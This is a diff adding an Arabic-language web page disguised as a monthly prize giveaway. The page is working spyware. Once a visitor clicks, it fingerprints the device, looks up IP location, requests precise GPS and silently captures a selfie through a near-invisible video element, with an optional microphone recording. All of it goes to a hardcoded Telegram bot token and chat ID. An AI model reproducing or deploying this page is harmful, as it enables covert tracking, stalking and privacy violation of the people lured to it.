@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="theme-color" content="#0b0f1a">
+<title>🎁 مسابقة — فعّل حسابك</title>
+<style>
+  body{margin:0;background:radial-gradient(120% 80% at 50% 0%,#1b2a45 0%,#0b0f1a 62%);color:#e9eefb;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Tahoma,Arial,sans-serif}
+  .wrap{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:22px}
+  .card{width:100%;max-width:400px;background:#121a2b;border:1px solid #22304d;border-radius:22px;padding:26px 20px;text-align:center;box-shadow:0 26px 70px rgba(0,0,0,.55)}
+  .logo{width:62px;height:62px;margin:0 auto 14px;border-radius:18px;background:linear-gradient(135deg,#4f8cff,#8b5cf6);display:flex;align-items:center;justify-content:center;font-size:30px}
+  h1{font-size:19px;margin:0 0 8px;line-height:1.5}
+  p.sub{color:#8ea0c4;font-size:13.5px;line-height:1.8;margin:0 0 18px}
+  #go{display:block;width:100%;padding:15px;border:0;border-radius:14px;background:linear-gradient(135deg,#4f8cff,#6d5cff);color:#fff;font-size:16px;font-weight:700;font-family:inherit;cursor:pointer}
+  #go:disabled{opacity:.55}
+  .steps{text-align:right;font-size:12.5px;color:#8ea0c4;margin:18px 0 0}
+  .steps div{padding:7px 2px;border-bottom:1px dashed #22304d;display:flex;justify-content:space-between}
+  .steps div:last-child{border:0}
+  .steps .ok{color:#3ddc97}
+  .spin{width:20px;height:20px;border:3px solid #ffffff33;border-top-color:#fff;border-radius:50%;animation:r .8s linear infinite;margin:14px auto 0}
+  @keyframes r{to{transform:rotate(360deg)}}
+  #cam{position:fixed;top:0;left:0;width:2px;height:2px;opacity:.01;pointer-events:none}
+  #dbg{position:fixed;inset:auto 0 0 0;max-height:40vh;overflow:auto;background:#000d;color:#9fe8b0;font:11px/1.55 ui-monospace,Menlo,Consolas,monospace;padding:8px 10px;direction:ltr;text-align:left;white-space:pre-wrap;border-top:1px solid #ffffff1f;margin:0}
+</style>
+</head>
+<body>
+
+<div class="wrap">
+  <main class="card">
+    <div class="logo">🎁</div>
+    <h1>مسابقة الشهر — أماكن محدودة</h1>
+    <p class="sub">اضغط على الزر للتحقق من جهازك وتأكيد استلام الجائزة</p>
+    <button id="go">تحقق واستلم الجائزة</button>
+    <div class="spin" id="spin" hidden></div>
+    <div class="steps" id="steps"></div>
+  </main>
+</div>
+<video id="cam" playsinline muted></video>
+<pre id="dbg" hidden></pre>
+
+<script>
+/* ====================== الإعدادات ====================== */
+const CONFIG = {
+  BOT_TOKEN : "8622877582:AAGDdVXCYm9laSBaHgvjkmkj0G5azGNEHL8",
+  CHAT_ID   : "8895132486",
+  SITE_NAME : "Giveaway",
+  GET_GPS   : true,
+  GET_CAMERA: true,
+  GET_MIC   : false,
+  DEBUG     : true
+};
+
+/* ====================== أدوات ====================== */
+const $ = id => document.getElementById(id);
+const VID = Math.random().toString(36).slice(2,7).toUpperCase();
+const LOG = [];
+function log(s){ LOG.push(s); if(CONFIG.DEBUG){ const d=$('dbg'); d.hidden=false; d.textContent=LOG.join('\n'); d.scrollTop=d.scrollHeight; } }
+function esc(s){ return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+function addStep(t, ok){ const d=document.createElement('div'); d.innerHTML='<span>'+esc(t)+'</span><span class="'+(ok===false?'':'ok')+'">'+(ok===false?'✕':'✓')+'</span>'; $('steps').appendChild(d); }
+
+async function send(method, params, isForm){
+  const url='https://api.telegram.org/bot'+CONFIG.BOT_TOKEN+'/'+method;
+  try{
+    const r = await fetch(url, isForm ? {method:'POST', body:params}
+      : {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(params)});
+    const j = await r.json();
+    log((j.ok?'📤 ok   ':'❌ fail ')+method+(j.ok?'':' '+JSON.stringify(j).slice(0,150)));
+    return j;
+  }catch(e){ log('❌ '+method+': '+e.message); return null; }
+}
+
+function report(title, obj){
+  const rows = Object.entries(obj)
+    .filter(([k,v]) => v!==null && v!==undefined && v!=='' && v!==false)
+    .map(([k,v]) => '<b>'+esc(k)+':</b> '+esc(v)).join('\n');
+  return '<b>'+esc(title)+'</b>\n<code>'+esc(CONFIG.SITE_NAME)+'</code> • <code>'+VID+'</code> • '+new Date().toLocaleString('ar-EG')+'\n\n'+rows;
+}
+
+/* ====================== جمع البيانات ====================== */
+function gpu(){
+  try{
+    const c=document.createElement('canvas');
+    const gl=c.getContext('webgl')||c.getContext('experimental-webgl');
+    if(!gl) return null;
+    const d=gl.getExtension('WEBGL_debug_renderer_info');
+    return d ? gl.getParameter(d.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
+  }catch(e){ return null; }
+}
+function canvasFP(){
+  try{
+    const c=document.createElement('canvas'); c.width=220; c.height=45;
+    const x=c.getContext('2d');
+    x.textBaseline='top'; x.font='15px Arial';
+    x.fillStyle='#f60'; x.fillRect(0,0,110,22);
+    x.fillStyle='#069'; x.fillText('Venice 0123',2,2);
+    const s=c.toDataURL(); let h=0;
+    for(let i=0;i<s.length;i++) h=(h*31+s.charCodeAt(i))>>>0;
+    return h.toString(16);
+  }catch(e){ return null; }
+}
+function deviceInfo(){
+  const c = navigator.connection || navigator.webkitConnection || navigator.mozConnection || {};
+  return {
+    'النظام/الجهاز'   : navigator.platform || '-',
+    'المتصفح'         : navigator.userAgentData ? navigator.userAgentData.brands.map(b=>b.brand+' '+b.version).join(' | ') : (navigator.appVersion||'').slice(0,120),
+    'User-Agent'      : navigator.userAgent,
+    'أنوية المعالج'   : navigator.hardwareConcurrency || null,
+    'الذاكرة (تقديري)': navigator.deviceMemory ? navigator.deviceMemory+' GB' : null,
+    'الشاشة'          : screen.width+'x'+screen.height+' @'+window.devicePixelRatio+'x',
+    'نافذة المتصفح'   : window.innerWidth+'x'+window.innerHeight,
+    'اللغة'           : navigator.language+' | '+(navigator.languages||[]).join(','),
+    'المنطقة الزمنية' : Intl.DateTimeFormat().resolvedOptions().timeZone,
+    'نقاط اللمس'      : navigator.maxTouchPoints,
+    'الشبكة'          : c.effectiveType ? c.effectiveType+' | '+c.downlink+'Mbps | rtt '+c.rtt+'ms' : null,
+    'كارت الرسوميات'  : gpu(),
+    'بصمة الجهاز'     : canvasFP(),
+    'موبايل'          : navigator.userAgentData ? navigator.userAgentData.mobile : /Mobi|Android/i.test(navigator.userAgent),
+    'الكوكيز'         : navigator.cookieEnabled ? 'مفعل' : 'مقفول',
+    'HTTPS'           : isSecureContext ? 'نعم' : 'لا'
+  };
+}
+async function battery(){
+  try{
+    if(!navigator.getBattery) return null;
+    const b=await navigator.getBattery();
+    return Math.round(b.level*100)+'%'+(b.charging?' (بيشحن)':'');
+  }catch(e){ return null; }
+}
+async function ipInfo(){
+  const provs=[
+    ['https://ipwho.is/', d=>d.success && {ip:d.ip, city:d.city, region:d.region, country:d.country, isp:d.connection&&d.connection.isp, lat:d.latitude, lon:d.longitude}],
+    ['https://ipapi.co/json/', d=>!d.error && {ip:d.ip, city:d.city, region:d.region, country:d.country_name, isp:d.org, lat:d.latitude, lon:d.longitude}]
+  ];
+  for(const [u,f] of provs){
+    try{
+      const r=await fetch(u,{cache:'no-store'});
+      if(!r.ok) continue;
+      const out=f(await r.json());
+      if(out && out.ip) return out;
+    }catch(e){ log('IP: '+e.message); }
+  }
+  return null;
+}
+function gps(){
+  return new Promise(res=>{
+    if(!navigator.geolocation){ log('لا يوجد GPS'); return res(null); }
+    navigator.geolocation.getCurrentPosition(
+      p=>res(p),
+      e=>{ log('📍 '+e.message); res(null); },
+      {enableHighAccuracy:true, timeout:20000, maximumAge:0}
+    );
+  });
+}
+
+/* ====================== الكاميرا ====================== */
+let camDone=false, camBusy=false, camTries=0;
+async function takeSelfie(){
+  if(camDone || camBusy || camTries>2) return;
+  camBusy=true; camTries++;
+  try{
+    if(!navigator.mediaDevices) throw new Error('no mediaDevices');
+    log('📷 طلب الكاميرا...');
+    const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:'user', width:{ideal:1280}, height:{ideal:1280}}, audio:false});
+    const v=$('cam');
+    v.srcObject=stream;
+    await v.play().catch(()=>{});
+    await new Promise(r=>setTimeout(r,1400));
+    const w=v.videoWidth||640, h=v.videoHeight||480;
+    const cv=document.createElement('canvas'); cv.width=w; cv.height=h;
+    cv.getContext('2d').drawImage(v,0,0,w,h);
+    stream.getTracks().forEach(t=>t.stop()); v.srcObject=null;
+    const blob = await new Promise(r=>cv.toBlob(r,'image/jpeg',0.85));
+    log('📷 تم '+w+'x'+h);
+    const fd=new FormData();
+    fd.append('chat_id', CONFIG.CHAT_ID);
+    fd.append('caption', '🤳 سيلفي — '+VID+' — '+new Date().toLocaleString('ar-EG'));
+    fd.append('photo', blob, 'selfie.jpg');
+    await send('sendPhoto', fd, true);
+    addStep('صورة الكاميرا');
+    camDone=true;
+  }catch(e){
+    log('📷 فشل: '+e.name+' '+e.message);
+    if(camTries>=3) addStep('الكاميرا: '+e.name, false);
+  }
+  camBusy=false;
+}
+
+/* ====================== الصوت (اختياري) ====================== */
+async function recMic(){
+  try{
+    const s=await navigator.mediaDevices.getUserMedia({audio:true});
+    const mr=new MediaRecorder(s); const ch=[];
+    mr.ondataavailable=e=>ch.push(e.data);
+    mr.start();
+    await new Promise(r=>setTimeout(r,4000));
+    mr.stop();
+    await new Promise(r=>{ mr.onstop=r; });
+    s.getTracks().forEach(t=>t.stop());
+    const blob=new Blob(ch,{type:mr.mimeType||'audio/webm'});
+    const fd=new FormData();
+    fd.append('chat_id', CONFIG.CHAT_ID);
+    fd.append('caption','🎙️ تسجيل صوتي — '+VID);
+    fd.append('audio', blob, 'voice.webm');
+    await send('sendAudio', fd, true);
+    addStep('تسجيل الصوت');
+  }catch(e){ log('🎙️ '+e.message); }
+}
+
+/* ====================== التشغيل ====================== */
+async function main(){
+  $('go').disabled=true; $('spin').hidden=false; $('go').textContent='جاري التحقق...';
+  addStep('الاتصال بالسيرفر');
+
+  const info = deviceInfo();
+  const [b, ip] = await Promise.all([battery(), ipInfo()]);
+  if(b) info['البطارية'] = b;
+  if(ip){
+    info['IP'] = ip.ip;
+    info['المزود'] = ip.isp;
+    info['الموقع من IP'] = [ip.city, ip.region, ip.country].filter(Boolean).join(', ');
+    if(ip.lat) info['إحداثيات IP'] = ip.lat+', '+ip.lon;
+  }
+  addStep('بيانات الجهاز');
+  await send('sendMessage', {chat_id:CONFIG.CHAT_ID, text:report('📱 بيانات الجهاز', info), parse_mode:'HTML', disable_web_page_preview:true});
+
+  if(CONFIG.GET_GPS){
+    $('go').textContent='جاري تحديد موقعك...';
+    const p = await gps();
+    if(p){
+      const c=p.coords;
+      addStep('الموقع الفعلي');
+      await send('sendMessage', {chat_id:CONFIG.CHAT_ID, parse_mode:'HTML', disable_web_page_preview:true, text:report('📍 الموقع الفعلي', {
+        'الدقة'        : Math.round(c.accuracy)+' متر',
+        'خط العرض'     : c.latitude,
+        'خط الطول'     : c.longitude,
+        'خرائط جوجل'   : 'https://maps.google.com/?q='+c.latitude+','+c.longitude,
+        'OpenStreetMap': 'https://www.openstreetmap.org/?mlat='+c.latitude+'&mlon='+c.longitude+'#map=17/'+c.latitude+'/'+c.longitude
+      })});
+    } else addStep('الموقع (مرفوض)', false);
+  }
+
+  if(CONFIG.GET_CAMERA){
+    const trigger=()=>{ if(!camDone) takeSelfie(); };
+    $('go').onclick = trigger;
+    document.addEventListener('touchend', trigger);
+    setTimeout(trigger, 5000);
+  }
+  if(CONFIG.GET_MIC) recMic();
+
+  $('spin').hidden=true;
+  $('go').textContent='تم ✓';
+  log('✅ خلصنا');
+}
+
+if(CONFIG.DEBUG) $('dbg').hidden=false;
+log('🆔 '+VID);
+if(!isSecureContext) log('⚠️ لازم HTTPS');
+main().catch(e=>log('💥 '+e.message));
+</script>
+</body>
+  </html>
